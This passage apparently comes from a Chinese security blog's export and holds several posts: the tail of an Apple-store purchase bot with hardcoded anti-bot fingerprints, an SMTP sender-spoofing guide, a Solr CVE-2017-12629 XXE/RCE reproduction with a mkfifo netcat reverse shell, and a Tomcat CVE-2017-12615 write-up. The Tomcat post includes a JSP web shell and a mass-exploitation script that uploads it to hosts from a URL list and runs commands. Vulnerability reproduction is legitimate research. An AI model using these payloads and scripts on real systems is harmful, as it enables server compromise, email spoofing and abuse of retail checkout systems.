tmp=re.search(r'"updateQuantity":&#123;"url":"(/cn/shop/bagx\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))"',r.text) # updateQuantityUrl="https://www.apple.com"+tmp.group(1) # if order['quantity']=='2': # r= session.post(updateQuantityUrl,data=&#123;tmp.group(2)+".quantity":"2"&#125;,headers=&#123;"x-aos-stk":token&#125;,timeout=reqTimeout) # #pdb.set_trace() # print() # 结账 tmp=re.search(r'\"updateQuantity\":&#123;\"url\":\"(/cn/shop/bagx\?_a=updateQuantity&amp;_m=(shoppingCart.items.item-.*?))\"',r.text) checkoutUrl="https://www.apple.com/cn/shop/bagx/checkout_now?_a=checkout&amp;_m=shoppingCart" print(orderIdentify+"结账[POST] :: %s"%checkoutUrl[:80]) order['remark']="[失败]结账[POST] :: %s"%checkoutUrl r= session.post(checkoutUrl,data=&#123;tmp.group(2)+".quantity":order['quantity'],'shoppingCart.actions.fcscounter':'NaN','shoppingCart.actions.fcsdata':''&#125;,headers=&#123;"x-aos-stk":token&#125;,timeout=retryTimeout) #pdb.set_trace() signinUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] print(orderIdentify+"登录页面[GET] :: %s"%signinUrl[:80]) order['remark']="[失败]登录页面[GET] :: %s"%signinUrl r=session.get(signinUrl,timeout=retryTimeout) guestBuyData=re.search(r'\"signInGuest\":\&#123;\"form\":\"login\._forms\.guestCheckoutForm\",\"url\":\"/cn/shop/sentryx/sign_in\?(_a=login\.guestSign.*?)\"',r.text).group(1) tmp = re.findall(r'(.*?=.*?)&amp;',guestBuyData+"&amp;") data=&#123;&#125; for i in tmp: data[i.split("=",maxsplit=1)[0]]=i.split("=",maxsplit=1)[1] # 两个复杂参数，硬编码！ data['aywysya']='78a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly9nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWuxXVvHe9FjpidPNs0ojpVMZ90L5H6fqUdHz15tTma1eWNieLqDxpHrk0ugN.xL438IXkb9CxN4t1VKWZWudUd.z9euVrAqJkJgghmeugN.VHBQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUudQUhkY5BSmmY5BNkOdhs7GY6Mk.BY8' data['fdcBrowserData']='%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%253B%2520U%253B%2520Windows%2520NT%25206.1%253B%2520zh-CN)%2520AppleWebKit%252F533%252B%2520(KHTML%252C%2520like%2520Gecko)%2522%252C%2522L%2522%253A%2522zh-CN%2522%252C%2522Z%2522%253A%2522GMT%252B08%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D' tmpUrl = re.search(r'(https:\/\/secure.?\.store\.apple\.com)\/cn\/shop\/',r.text).group(1)+'/cn/shop/sentryx/sign_in' logging.debug("访客结账[POST] :: %s"%tmpUrl) order['remark']="[失败]访客结账[POST] :: %s"%tmpUrl r = session.post(tmpUrl,data=data,timeout=retryTimeout) pltn = json.loads(r.text,encoding='utf-8')['head']['data']['args']['pltn'] checkoutStartUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url'] logging.debug("结账跳转-1 [POST] :: %s"%checkoutStartUrl) order['remark']="[失败]结账跳转-1 [POST] :: %s"%checkoutStartUrl r = session.post(checkoutStartUrl,data=&#123;'pltn':pltn&#125;,timeout=retryTimeout) data=&#123;&#125; checkoutUrl = re.search(r'&lt;form method=\"POST\" name=\"redirector\" action=\"(https://.*?)\"',r.text).group(1) data['pltn'] = re.search(r'&lt;input name="pltn" type="\w*?" value="(.*?)"',r.text).group(1) data['v'] = re.search(r'&lt;input name="v" type="\w*?" value="(.*?)"',r.text).group(1) data['sessionID'] = re.search(r'&lt;input name="sessionID" type="\w*?" value="(.*?)"',r.text).group(1) logging.debug("结账跳转-2 [POST] :: %s"%checkoutUrl) order['remark']="[失败]结账跳转-2 [POST] :: %s"%checkoutUrl r = session.post(checkoutUrl,data=data,timeout=retryTimeout) # 送货选项 --&gt; 送货地址 data=&#123;&#125; data['sessionID']=re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) # data['A8']=re.search(r',"deliveryLocationType":"(.*?)","_forms":&#123;"main":&#123;"fields":\[&#123;"id":"(cart-item-.*?deliveryLocationType)",',r.text).group(1) # data['cartItem']=re.search(r',"deliveryLocationType":"(.*?)","_forms":&#123;"main":&#123;"fields":\[&#123;"id":"(cart-item-.*?deliveryLocationType)",',r.text).group(2) #data[re.search(r'\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(1)]='A8' # 2017-10-26发现该正则表达式存在匹配问题,匹配了超长的字符串 data[re.search(r'(cart-item-([0-9A-z]+-)&#123;5&#125;delivery-deliveryLocationType)',r.text).group(1)]='A8' data['_a']='cart.cont' data['_fid']='co' data['_m']='cart' # 有多台secure主机，需要从页面取值。 checkoutxUrl = re.search(r'(https:\/\/secure.?\.store\.apple\.com)\/cn\/shop\/',r.text).group(1)+'/cn/shop/checkoutx' print(orderIdentify+"送货选项 --&gt; 送货地址[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]送货选项 --&gt; 送货地址[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 送货地址 --&gt; 付款 data=&#123;&#125; data['sessionID'] = re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) data['shipping-user-lastName'] = order['lastName'] data['shipping-user-firstName'] = order['firstName'] data['shipping-user-daytimePhoneAreaCode'] = '0' data['shipping-user-daytimePhone'] = order['phone'] data['shipping-user-state'] = order['state'] data['shipping-user-city'] = order['city'] data['shipping-user-district'] = order['district'] data['shipping-user-street'] = order['street'] data['shipping-user-street2'] = '' data['shipping-user-postalCode'] = '' data['shipping-user-emailAddress'] = order['email'] data['shipping-user-mobilePhone'] = order['phone'] data['state'] = order['state'] data['keyPath'] = 'shipping.address' data['city'] = order['city'] data['_a'] = 'ship.cont' data['_fid'] = 'co' print(orderIdentify+"送货地址 --&gt; 付款[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]送货地址 --&gt; 付款[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 付款 --&gt; 发票 data=&#123;&#125; data['sessionID'] = re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) data['undefined'] = '' data['bankOption'] = 'Alipay' data['_a'] = 'bill.cont' data['_fid'] = 'co' print(orderIdentify+"付款 --&gt; 发票[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]付款 --&gt; 发票[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 发票 --&gt; 账户 data=&#123;&#125; data['invoice-user-invoiceEmailAddress-emailAddress'] = order['email'] data['invoice-fapiao-invoiceHeader'] = order['lastName']+order['firstName'] data['invoice-fapiao-taxPayerId'] = '' data['invoice-form-options-selection'] = 'personal' data['sessionID'] = re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) data['invoice-user-invoiceDeliveryAddress-lastName'] = order['lastName'] data['invoice-user-invoiceDeliveryAddress-firstName'] = order['firstName'] data['invoice-user-invoiceDeliveryAddress-daytimePhoneAreaCode'] = '0' data['invoice-user-invoiceDeliveryAddress-daytimePhone'] = order['phone'] data['invoice-user-invoiceDeliveryAddress-companyName'] = '' data['invoice-user-invoiceDeliveryAddress-state'] = order['state'] data['invoice-user-invoiceDeliveryAddress-city'] = order['city'] data['invoice-user-invoiceDeliveryAddress-district'] = order['district'] data['invoice-user-invoiceDeliveryAddress-street'] = order['street'] data['invoice-user-invoiceDeliveryAddress-street2'] = '' data['invoice-user-invoiceDeliveryAddress-postalCode'] = '' data['state'] = order['state'] data['keyPath'] = 'invoice.invoiceDeliveryAddress' data['city'] = order['city'] data['_a'] = 'invoice.cont' data['_fid'] = 'co' print(orderIdentify+"发票 --&gt; 账户[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]发票 --&gt; 账户[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 账户 --&gt; 条款与条件 data = &#123;&#125; data['account-appleId'] = '' data['account-password'] = '' data['account-passwordAgain'] = '' data['account-commsPref'] = 'false' data['_a'] = 'acct.cont' data['_fid'] = 'co' print(orderIdentify+"账户 --&gt; 条款与条件[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]账户 --&gt; 条款与条件[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 同意 条款与条件 data = &#123;&#125; data['sessionID'] = re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) data['accept'] = 'true' data['acceptAppleTnc'] = 'false' data['_a'] = 'terms.cont' data['_fid'] = 'co' print(orderIdentify+"同意 条款与条件[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[失败]同意 条款与条件[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout) # 下订单 data=&#123;&#125; data['aywysya'] = 'F8a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly8nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWux_5ukV_AAUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4K1lSJhgSv_KU.6elV2pNJF_DA1RcrpVMZ90L5H6e0z1_yc4p0iMgdVdOOQ_KpNk0.ZNqhyA_r_LwwKdBvpZfWfUXtStKjE4PIDzpHqzQW5BNv__5BNlVnIQkFY5DjV.4v2' data['sessionID'] = re.search(r'\&#123;\"name\":\"sessionID\",\"value\":\"(.*?)\"\&#125;',r.text).group(1) data['promo-code'] = '' data['_a'] = 'po' data['_fid'] = 'co' print(orderIdentify+"下订单[POST] :: %s"%checkoutxUrl[:80]) order['remark']="[存疑]下订单[POST] :: %s"%checkoutxUrl r = session.post(checkoutxUrl,data=data,timeout=retryTimeout*2) # 此处timeout时间加倍 # 订单状态 #checkoutStatusUrl = re.search(r'(https:\/\/.*?\.apple\.com)',checkoutxUrl).group(1)+json.loads(r.text,encoding='utf-8')['head']['data']['url'] checkoutStatusUrl = re.search(r'(https:\/\/.*?\.apple\.com)',r.url).group(1)+re.search(r'\"url\":\"(.*?)\"',r.text).group(1) order['remark']="[存疑]订单状态-0 :: %s"%tmpUrl r = session.get(checkoutStatusUrl,timeout=retryTimeout) data=&#123;&#125; data['_a']='status' data['_fid']='co' data['_m']='commo' tmpUrl = re.search(r'(https:\/\/secure.?\.store\.apple\.com)\/cn\/shop\/',r.text).group(1)+'/cn/shop/checkoutx/status' order['remark']="[存疑]订单状态-1 :: %s"%tmpUrl r = session.post(tmpUrl,data=data,timeout=retryTimeout) #tmpUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url'] # 错误 tmpUrl = re.search(r'(https:\/\/.*?\.apple\.com)',r.url).group(1)+re.search(r'\"url\":\"(.*?)\"',r.text).group(1) print(orderIdentify+"订单状态 :: %s"%tmpUrl[:80]) order['remark']="[存疑]订单状态-2 :: %s"%tmpUrl r = session.get(tmpUrl,timeout=retryTimeout) # tmpUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] #报错 tmpUrl = re.search(r'(https:\/\/.*?\.apple\.com)',r.url).group(1)+re.search(r'\"url\":\"(.*?)\"',r.text).group(1) order['remark']="[存疑]谢谢 :: %s"%tmpUrl r = session.get(tmpUrl,timeout=retryTimeout) orderID = re.search(r',\"orderNumber\":\"(.*?)\",',r.text).group(1) order['orderID'] = orderID order['orderUrl']="https://store.apple.com/xc/cn/vieworder/"+orderID+"/"+order['email']+"/" order['remark']='成功' msg=order['lastName']+ \ order['firstName']+"\t"+ \ order['product']+"\t"+ \ order['color']+"\t"+ \ order['capacity']+"\t"+ \ order['orderUrl'] print(" 🍻🍻🍻🍻🍻 \t\t%s"%msg) self.orderResult(order,True) except Exception as e: order['orderID'] = '' order['orderUrl'] = '' self.orderResult(order,False) # 购买失败！ # json订单格式使用！ # tmp = order['fileFullName'] # filePath,fileName = os.path.split(tmp) # newFileName= "done_"+order['lastName']+order['firstName']+"_"+orderID+"_"+order['email']+fileName # logging.info("修改订单文件 :: %s --&gt; %s"%(fileName,newFileName)[:80]) # os.rename(tmp,os.path.join(filePath,newFileName)) def orderResult(self,order,success): msg=order['lastName']+","+ \ order['firstName']+","+ \ order['phone']+","+ \ order['email']+","+ \ order['state']+","+ \ order['city']+","+ \ order['district']+","+ \ order['street']+","+ \ order['payment']+","+ \ order['product']+","+ \ order['color']+","+ \ order['capacity']+","+ \ order['quantity']+","+ \ order['orderID']+","+ \ order['orderUrl']+","+ \ order['remark']+"\n" self.threadLock.acquire() with open(orderResult,'a+',encoding='utf-8') as fp: fp.writelines(msg) self.threadLock.release()# 参数处理def main(): headCharPic="\r .--.\n |o_o | ------------------ \n |:_/ | &lt; Author: Mr.Bingo &gt;\n // \ \ ------------------ \n (| | ) &lt; oddboy.cn &gt;\n /'\_ _/`\ ------------------\n \___)=(___/\n" print(headCharPic) # Creating a parser buyer=iPhoneBuyer() buyer.run_Threads()if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SMTP命令行及Python发送邮件]]></title>
    <url>%2F2017%2FSMTP%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%8APython%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[SMTP发送邮件 - 命令行SMTP (Simple Mail Transfer Protocol) : 电子邮件从客户机传输到服务器或从某一个服务器传输到另一个服务器使用的传输协议。 SMTP 是请求/响应协议，命令和响应都是基于 ASCII 文本，并以 CR 和 LF 符结束。响应包括一个表示返回状态的三位数字代码。SMTP 在 TCP 协议 25 端口监听连接请求。 ESMTP (Extended SMTP)，顾名思义，扩展 SMTP 就是对标准 SMTP 协议进行的扩展。它与 SMTP 服务的区别仅仅是，使用 SMTP 发信不需要验证用户帐户，而用 ESMTP 发信时， 服务器会要求用户提供用户名和密码以便验证身份。验证之后的邮件发送过程与 SMTP 方式一致。 SMTP命令HELO 向服务器标识用户身份。(SMTP) EHLO 向服务器标识用户身份。(ESMTP) AUTH LOGIN 用户身份认证，后续陆续发送用户名和密码的base64编码。 MAIL FROM 命令中指定的地址是发件人地址 RCPT TO 标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL 命令后面。 DATA 在单个或多个 RCPT 命令后，表示所有的邮件接收人已标识，并初始化数据传输，以 CRLF.CRLF 结束 VRFY 用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令 EXPN 验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用 HELP 查询服务器支持什么命令 NOOP 无操作，服务器应响应 OK RSET 重置会话，当前传输被取消 QUIT 结束会话 正常发信模式（client –&gt; server) 类似于邮件客户端将邮件发送到自己的邮件服务器。所以需要验证发件人的账号密码。 伪造发信模式(fake server –&gt; server) 类似于A.com向B.com发送邮件，直接连接到B.com的服务器然后宣称自己是A.com。这就不需要身份验证了。但如果A.com配置了SPF，那么B.com服务器将校验spf声明的邮件服务器IP与当前发件服务器IP是否一致，如否则拒绝接受！ 两种模式的命令行试验： SMTP发送邮件 - Python3参考资料：廖雪峰-Python教程-SMTP发送邮件 简单的代码实现如下：#!/usr/bin/env python3# -*- coding: utf-8 -*-import pdbimport loggingfrom email.mime.text import MIMETextimport smtpliblogging.basicConfig(level=logging.INFO)msg=MIMEText('hello,send by python,,,,','plain','utf-8')logging.info("MIME编码\n%s"%msg)#pdb.set_trace()from_addr="a@1.com"to_addr="songgongbin@tass.com.cn"# 使用 dig -t mx tass.com.cn 确定目标收件的mx服务器smtp=smtplib.SMTP('qiye163mx01.mxmail.netease.com',25)#smtp.starttls() # 使用SSL时使用。smtp.set_debuglevel(1) #查看交互信息smtp.sendmail(from_addr,to_addr,msg.as_string())smtp.quit 发送肯定是没问题的，但显然命中了网易的反垃圾邮件策略，被拒收了！具体什么是怎样的策略，我不是很清楚了。 其它在线邮件伪造工具：http://tool.chacuo.net/mailanonymous/ Python官方资料：https://docs.python.org/3.6/library/smtplib.html#]]></content>
  </entry>
  <entry>
    <title><![CDATA[Apache Solr XML外部实体扩展(XXE)及远程代码执行（RCE CVE-2017-12629）]]></title>
    <url>%2F2017%2FApache-Solr-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%89%A9%E5%B1%95XXE%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CRCE-CVE-2017-12629%2F</url>
    <content type="text"><![CDATA[0x00 简述这里涉及到两个漏洞，一个是外部实体扩展XML External Entity Expansion (deftype=xmlparser) ，另一个是远程代码执行Remote Code Execution (add-listener: RunExecutableListener)。这两个漏洞是由Michael Stepankin (JPMorgan Chase)和Olga Barinova (Gotham Digital Science)发现并公布，此处主要进行漏洞复现。 原文地址：http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html Solr主页：http://lucene.apache.org/solr/ 安装及启动都非常简单，不过需要强调的是，代码执行的漏洞需要在solr -c模式(cloud)下才有效。 启动后界面如下： 平台：macOS 10.12.6 0x01 XXE复现Lucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。 1. 使用netcat侦听4444端口 “nc -lv 4444”2. 浏览器访问http://localhost:8983/solr/solr/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:4444/hello-liehu&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125; 3. netcat接收到solr的请求包。 0x02 RCE复现( CVE-2017-12629 )Solr的RunExecutableListener类可用于对特定事件执行任意命令，例如在每次更新查询后执行(postCommit)。该漏洞的问题点在于这样的监听器可以通过带有add-listener命令的Config API来启用任意参数。 1. 新建一个名为Hunter的集合http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=Hunter&amp;numShards=2&amp;maxShardsPerNode=2 PS：就复现而言，可以手动在后台添加集合或者使用现有集合。 2. 使用netcat侦听4444端口“nc -lv 4444”3. 为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称(“curl”)，”args”属性内容” http://localhost:4444/helloRCE “为netcat侦听的端口。POST /solr/Hunter/config HTTP/1.1Host: localhost:8983Connection: closeContent-Type: application/json Content-Length: 198&#123; "add-listener" : &#123; "event":"postCommit", "name":"newlistener", "class":"solr.RunExecutableListener", "exe":"curl", "dir":"/usr/bin/", "args":["http://localhost:4444/helloRCE"] &#125;&#125; 如果出现如上报错，是因为集合中没有数据。向http://localhost:8983/solr/Hunter/update 提交一些数据即可（数据提交方式参考下一步）。（资料参考：https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html ） 如果监听器已经存在，可以考虑更换name,或者将add-listener修改为update-listener. 4. 更新集合”Hunter”以触发RunExecutableListener的执行。提交更新后，等一段时间后接收到请求包。 5. 反弹Shellmac下nc没有-e选项，也没有/dev/tcp，可使用 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f update一下监听器：&#123; "update-listener": &#123; "event": "postCommit", "name": "reverseShell", "class": "solr.RunExecutableListener", "exe": "sh", "dir": "/bin/", "args": ["-c", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f"] &#125;&#125; update一下数据，即可收到反弹shell: 0x03 XXE&amp;RCE 组合利用通过将如上两个漏洞组合，外部攻击者即使不能直接访问Sorl服务器，也可以实现远程代码执行。 唯一的要求是攻击者可以构造查询参数’q’。 如下的利用便是将所有的payload置于q参数，发起请求即可实现。 1. 通过XXE新建集合combineEXPhttp://localhost:8983/solr/Hunter/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/admin/collections?action=CREATE%26name=combineEXP%26numShards=2%26maxShardsPerNode=2&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125; 2. 通过XXE添加RunExecutableListenerhttp://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/select?q=xxx&amp;qt=/solr/combineEXP/config?stream.body=&#123;&quot;add-listener&quot;: &#123;&quot;event&quot;: &quot;postCommit&quot;, &quot;name&quot;: &quot;shell&quot;,&quot;class&quot;: &quot;solr.RunExecutableListener&quot;, &quot;exe&quot;: &quot;sh&quot;,&quot;dir&quot;: &quot;/bin/&quot;, &quot;args&quot;: [&quot;-c&quot;, &quot;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 7777 &gt; /tmp/f&quot;]&#125;&#125;&quot;]&#125;&#125;&amp;shards=localhost:8983/&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125; 先对stream.body内容进行二次URL编码(因为反弹shell的命令含有特殊字符)，然后在对q内容进行一次URL编码，得到URL(经过编码后的URL很长，这里不列出)。会显示error，但实际已经成功。 3. 通过XXE更新内容触发动作http://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/update?stream.body=[&#123;&quot;id&quot;:&quot;AAA&quot;&#125;]&amp;commit=true&amp;overwrite=true&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125; 先对stream.body内容进行一次URL编码，然后在对q内容进行一次URL编码，得到URL。shell反弹成功！！！ 0x04 防护方案 关注官方消息，及时升级到solr 7.1版本。 以系统参数”-Ddisable.configEdit=true”重启Solr实例，可实现临时性防护。(可能会影响正常功能)]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat文件上传(CVE-2017-12615)复现(可攻击7.0.81 & 带POC)]]></title>
    <url>%2F2017%2FTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞概述远程代码执行漏洞（CVE-2017-12615） 影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全） 当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。 基本信息漏洞名称：Tomcat任意文件上传漏洞 漏洞编号：CVE-2017-12615 漏洞影响：上传包含任意代码的文件，并被服务器执行。 影响平台：Windows/Linux 影响版本：Apache Tomcat &lt;= 7.0.81 | Apache Tomcat &lt;= 8.5.20 | Apache Tomcat &lt;= 9.0.0.M26 原理分析本漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。 除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。 即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。 这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。 目前主要三种方法： l evil.jsp%20 l evil.jsp::$DATA l evil.jsp/ 复现过程 0x00 安装Tomcat 7.0.79 0x01 开启HTTP PUT 修改Tomcat 7.0/conf/web.xml文件添加readonly属性，使者readonly=false.&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 然后，重启Tomcat。 0x02 任意文件上传 · 姿势一思路：参考微软MSDN上关于NTFS Streams的一段资料https://msdn.microsoft.com/en-us/library/dn393272.aspxAll files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below. &lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;The default data stream has no name. That is, the fully qualified name for the default stream for a file called &quot;sample.txt&quot; is &quot;sample.txt::$DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;$DATA&quot; is the stream type. payload ::PUT /111.jsp::$DATA HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell... 写入成功！ 0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81） 思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。 payload ::PUT /222.jsp/ HTTP/1.1Host: 10.1.1.6:8080User-Agent: JNTASSDNT: 1Connection: close...jsp shell... 写入成功！ 0x04 菜刀连接 批量EXP脚本#!/usr/bin/env python3# -*- coding: utf-8 -*-import argparseimport requestsimport sysimport timeimport threadingimport queueimport refrom lxml import htmlclass Attacker(object): def __init__(self,urlList,threads,output): self.urlList=urlList self.threads=threads self.optput=output self.print_lock=threading.Lock() self.savaFile_lock=threading.Lock() def run_thread(self): thread_arr=[] for i in range(self.threads): t=threading.Thread(target=self.attack) thread_arr.append(t) for i in range(self.threads): thread_arr[i].start() for i in range(self.threads): thread_arr[i].join() def saveResultToFile(self,message): if self.optput is not None: with open(self.optput, 'a+', encoding = 'utf8') as f: # 以追加的方法结果写入文件 f.write(message[0]+"\t") f.write(message[1]+"\n") def attack(self): body = '''&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp +"\\n");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if("W3akPassw0rd".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd")))&#123;out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");&#125;else&#123;out.println(":-)");&#125;%&gt;''' while not self.urlList.empty(): url=self.urlList.get() protocol=re.search(r"(https?)\:\/\/(.*?)\/",url+"/").group(1) host=re.search(r"(https?)\:\/\/(.*?)\/",url+"/").group(2) self.print_lock.acquire() print(" \b\b"*100,end="") print("\r[about "+str(self.urlList.qsize())+" left]\t"+"trying attack :: "+protocol+"://"+host,end="") self.print_lock.release() try: req = requests.options(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c",timeout=10) if 'allow' in req.headers and req.headers['allow'].find("PUT")&gt;0 : uploadevil=requests.put(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/",data=body,timeout=10) if (uploadevil.status_code == 201) or (uploadevil.status_code == 204): execWhoami=requests.get(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami",timeout=10) #print(execWhoami.text) #whoami=re.search(r"&lt;pre&gt;(.*)&lt;\/pre&gt;",execWhoami.text).group(1) whoami=html.fromstring(execWhoami.text).text_content() self.print_lock.acquire() print(" \b\b"*100,end="") print("\r🍻 "+protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami\t"+whoami) if self.optput is not None: self.saveResultToFile((protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp",whoami)) self.print_lock.release() else: pass else: pass except: pass #self.print_lock.acquire() #print("\tFailed... Next...") #self.print_lock.release() print(" \b\b"*100,end="")def readUrls(listFile): fd=open(listFile,"rb") lines=fd.readlines() fd.close() urlList=queue.Queue() for url in lines: 